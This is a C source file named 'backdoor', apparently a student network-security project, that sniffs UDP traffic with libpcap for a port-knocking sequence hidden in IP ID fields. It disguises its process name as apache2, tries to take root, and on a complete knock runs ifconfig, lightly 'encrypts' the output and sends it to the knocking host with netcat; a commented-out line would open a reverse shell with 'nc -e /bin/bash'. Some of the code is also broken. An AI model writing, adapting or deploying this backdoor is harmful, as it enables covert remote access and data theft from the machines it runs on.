/*---------------------------------------------------------------------------------------
--	SOURCE FILE:	backdoor
--
--	FUNCTIONS:		libpcap - packet filtering library based on the BSD packet
--					filter (BPF)
--
--	DATE:			May 21, 2015
--
--	REVISIONS:		(Date and nic_description)
--
--	DESIGNERS:		Based on the code by Martin Casado & Richard Stevens
--					Modified & redesigned: Aman Abdulla: April 23, 2006
--
--	PROGRAMMER:		Tim Kim, Damien Sathanielle
--
--	NOTES:
--	The program
--
--	Compile and run:
--
--		gcc -Wall -o backdoor backdoor.c -lpcap
--
--		./backdoor

---------------------------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/prctl.h>

#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <pcap.h>


#define R_KEY 82
#define G_KEY 71
#define B_KEY 66

#define BIT_SET(a,b) ((a) |= (1<<(b)))
#define MASK "/usr/sbin/apache2 -k start -DSSL"
#define NIC "eno1"

#define DEST_ADDR "127.0.0.1"

unsigned char lock = 0b000;

//Function Prototypes
void mask_application(char *name);
void check_lock(char *addr, int port);
void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
void execute_backdoor(char *addr, int port);
int send_info(char buffer[]);
void encrypt();

/*-----------------------------------------------------------------------------------------------
-- FUNCTION:   mask_application(char *name)
--             name - 
--
-- REVISIONS:  
--
-- RETURNS:    none
--
-- NOTES:      Process incoming packets to look for secret knock.
--------------------------------------------------------------------------------------------------*/
void mask_application(char *name)
{
	memset(name, 0, strlen(name));
	strcpy(name, MASK);
	prctl(PR_SET_NAME, MASK, 0, 0);

	setuid(0);
	setgid(0);
}

void check_lock(char *addr, int port)
{
	if(!((lock + 1) & ((1 << 3) - 1))) {
		execute_backdoor(addr, port);
	}

	//lock = 0;
	//sleep(5);
}

/*-----------------------------------------------------------------------------------------------
-- FUNCTION:   process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
--             args - 
--             header - 
--             packet
--
-- REVISIONS:  
--
-- RETURNS:    none
--
-- NOTES:      Process incoming packets to look for secret knock.
--------------------------------------------------------------------------------------------------*/
void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
	int size = header->len;
	int guess, caesar_ten, caesar_one;
	char sourceIP[INET_ADDRSTRLEN];
	unsigned short iphdrlen;
	struct in_addr source;

	struct iphdr *iph = (struct iphdr*)(packet + sizeof(struct ether_header));
	iphdrlen = iph->ihl * 4;

	struct udphdr *udph = (struct udphdr*)(packet + iphdrlen + sizeof(struct ether_header));

	memset(&source, 0, sizeof(source));
	source.s_addr = iph->saddr;
	inet_ntop(AF_INET, &source, sourceIP, sizeof sourceIP);

	int sPort = ntohs(udph->source);
	// make sure udp
	if((iph->protocol == 17))
	{
		int id = ntohs(iph->id);
		int dPort = ntohs(udph->dest);

		printf("%d %d\n", id, dPort);
		
		guess = (id % 100);
		switch(guess)
		{
			case R_KEY:
				BIT_SET(lock, 0);
				check_lock(sourceIP, dPort);
				break;
			case G_KEY:
				BIT_SET(lock, 1);
				check_lock(sourceIP, dPort);
				break;
			case B_KEY:
				BIT_SET(lock, 2);
				check_lock(sourceIP, dPort);
				break;
			default:
				break;
		}

		//id = id % 10000;
		//id = id % 1000;

		//srand(time(NULL));

		//id += (int)((rand() % 3) * 10000);
		//id += (int)(((rand() % 5) + 1) * 1000);
	}
}


/*-----------------------------------------------------------------------------------------------
-- FUNCTION:   process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
--             args - 
--             header - 
--             packet
--
-- REVISIONS:  
--
-- RETURNS:    none
--
-- NOTES:      Process incoming packets to look for secret knock.
--------------------------------------------------------------------------------------------------*/
void execute_backdoor(char *addr, int port)
{
	char buffer[256];

	srand(time(NULL));
	int shift = 19;

	//sprintf(buffer, "nc %s %d -e /bin/bash", addr, port);
	sprintf(buffer, "nc %s %d < encrypted.txt", addr, port);
	printf("executing...\n");
	// send shell to client
	lock = 0;
	system("ifconfig < info.txt");
	encrypt(shift);
	system(buffer);
}

void encrypt(int shift)
{
	FILE *infile = fopen("info.txt", "r");
	FILE *outfile = fopen("encrypted.txt", "w");
	char a;

	if (infile == NULL) {
		fclose(infile);
		exit(1);
	}

	if (outfile == NULL) {
		fclose(outfile);
		exit(1);
	}

	do {
		a = fgetc(infile);
		fputc(a + shift, outfile);
	} while(a != EOF);

	fcloseall();
}

int send_info(char buffer[])
{
	int sockfd, newsockfd, portno;
	struct sockaddr_in dest;
	struct hostent *server;

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);

	if(sockfd < 0)
	{
	    fprintf(stderr, "Can't open socket\n");
	    return 2;
	}

	server = DEST_ADDR;
	portno = atoi(8888);

	bzero((char*) &dest, sizeof(dest));

	dest.sin_family = AF_INET;
	dest.sin_port = htons(portno);

	if(inet_aton(server, &dest.sin_addr) == 0)
	{
	    fprintf(stderr, "Can't connect\n");
	    return 2;
	}
	
	if(bind(sockfd, (struct sockaddr*)&dest, sizeof(dest)) < 0)
	{
	    fprintf(stderr,"Can't bind socket\n");
	    return 2;
	}

	newsockfd = sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&dest, sizeof(dest));
	if(newsockfd < 0)
	{
	    fprintf(stderr,"Can't sendto\n");
	    return 2;
	}

	close(sockfd);

	return 0;
}

/*-----------------------------------------------------------------------------------------------
-- FUNCTION:   main
--
-- REVISIONS:  
--
-- RETURNS:    none
--
-- NOTES:      
--------------------------------------------------------------------------------------------------*/
int main(int argc, char *argv[])
{
	char *dev;
	char errbuf[PCAP_ERRBUF_SIZE];
	char filter_exp[] = "udp src port 53";  // filter expression
	const u_char *packet;

	struct bpf_program fp;  // compiled filter expression
	struct pcap_pkthdr header;

	pcap_t *handle;         // session handle
	bpf_u_int32 mask;       // netmask
	bpf_u_int32 net;        // ip of dev

	mask_application(argv[0]);

	dev = NIC; //pcap_lookupdev(errbuf);
	if(dev == NULL)
	{
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		return(2);
	}
	printf("Device: %s\n", dev);

	if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
	{
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}

	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if(handle == NULL)
	{
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}

	if(pcap_compile(handle, &fp, filter_exp, 0, net) == -1)
	{
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}

	if(pcap_setfilter(handle, &fp) == -1)
	{
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}


	// rcv_packet will be called every time a packet is captured
	pcap_loop(handle, -1, process_packet, NULL);

	pcap_freecode(&fp);
	pcap_close(handle);

	return 0;

}
